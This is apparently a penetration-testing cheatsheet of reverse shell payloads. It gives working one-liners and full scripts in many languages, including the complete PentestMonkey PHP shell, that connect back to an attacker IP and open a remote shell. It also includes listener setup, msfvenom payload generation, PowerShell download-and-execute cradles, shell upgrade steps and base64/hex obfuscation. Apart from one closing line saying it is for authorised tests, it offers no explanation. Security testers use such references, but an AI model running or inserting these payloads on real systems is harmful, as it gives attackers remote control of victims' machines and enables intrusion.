# Reverse Shell Cheatsheet

## Setup Listener

```bash
# Netcat
nc -lvnp 4444

# Netcat (alternative)
nc -nlvp 4444

# Netcat mit IPv6
nc -6 -lvnp 4444

# Ncat (Nmap)
ncat -lvnp 4444

# Socat
socat TCP-LISTEN:4444,reuseaddr,fork -

# PowerShell (Windows)
powercat -l -p 4444

# Metasploit
use exploit/multi/handler
set PAYLOAD linux/x64/shell/reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run
```

---

## Bash Reverse Shells

### Standard Bash ⭐
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### Bash (alternative)
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

### Bash (exec)
```bash
exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Bash (0<&196)
```bash
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196
```

### Bash (UDP)
```bash
bash -i >& /dev/udp/10.10.14.5/4444 0>&1
```

---

## Netcat Reverse Shells

### NC -e (Traditional)
```bash
nc -e /bin/bash 10.10.14.5 4444
nc -e /bin/sh 10.10.14.5 4444
```

### NC ohne -e (BSD nc)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

### NC mit named pipe
```bash
rm -f /tmp/p; mknod /tmp/p p && nc 10.10.14.5 4444 0/tmp/p
```

### BusyBox nc
```bash
busybox nc 10.10.14.5 4444 -e /bin/sh
```

### Ncat (SSL)
```bash
ncat --ssl 10.10.14.5 4444 -e /bin/bash
```

---

## Python Reverse Shells

### Python 2
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Python 3
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Python (short)
```python
python -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'
```

### Python (IPv6)
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef::1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## PHP Reverse Shells

### PHP exec
```php
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP shell_exec
```php
php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP system
```php
php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP passthru
```php
php -r '$sock=fsockopen("10.10.14.5",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
```

### PHP PentestMonkey Script
```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.5';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

---

## Perl Reverse Shells

### Perl ⭐
```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Perl (no /bin/sh)
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Perl (Windows)
```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

---

## Ruby Reverse Shells

### Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Ruby (no /bin/sh)
```ruby
ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Ruby (Windows)
```ruby
ruby -rsocket -e 'c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

---

## Java Reverse Shells

### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Java (alternative)
```java
String host="10.10.14.5";
int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Socat Reverse Shells

### Socat
```bash
socat TCP:10.10.14.5:4444 EXEC:/bin/bash
```

### Socat (TTY)
```bash
socat TCP:10.10.14.5:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

### Socat Listener (mit TTY)
```bash
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
```

### Socat (SSL/Encrypted)
**Listener:**
```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT
```

**Client:**
```bash
socat OPENSSL:10.10.14.5:4444,verify=0 EXEC:/bin/bash
```

---

## PowerShell Reverse Shells (Windows)

### PowerShell One-Liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell (Base64)
```powershell
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
```

### PowerCat
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/powercat.ps1');powercat -c 10.10.14.5 -p 4444 -e cmd"
```

---

## Lua Reverse Shell

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.5','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

---

## Golang Reverse Shell

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.5:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

---

## Awk Reverse Shell

```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.5/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

---

## NodeJS Reverse Shell

```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')
```

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

---

## Telnet Reverse Shell

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.14.5 4444 0/tmp/p
```

```bash
telnet 10.10.14.5 4444 | /bin/bash | telnet 10.10.14.5 5555
```

---

## OpenSSL Reverse Shell

**Listener:**
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

**Client:**
```bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.14.5:4444 > /tmp/s; rm /tmp/s
```

---

## Msfvenom Payloads

### Linux x64 ELF
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf
chmod +x shell.elf
./shell.elf
```

### Linux x86 ELF
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf
```

### Windows x64 EXE
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe
```

### PHP
```bash
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php
```

### WAR (Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war
```

---

## Shell Upgrade (TTY)

### Python PTY
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Fully Interactive TTY
```bash
# In reverse shell
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z (background)

# On attacker machine
stty raw -echo; fg

# In reverse shell
reset
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows 38 columns 116
```

### Script
```bash
script /dev/null -c bash
```

### Socat
```bash
# Attacker
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

---

## Reverse Shell Obfuscation

### Base64
```bash
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo= | base64 -d | bash
```

### Hex
```bash
echo '62 61 73 68 20 2d 69 20 3e 26 20 2f 64 65 76 2f 74 63 70 2f 31 30 2e 31 30 2e 31 34 2e 35 2f 34 34 34 34 20 30 3e 26 31' | xxd -r -p | bash
```

---

## Quick Reference

```bash
# Listener
nc -lvnp 4444

# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# NC
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Upgrade
python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset
```

---

**Nur für autorisierte Penetration Tests!** 🎯
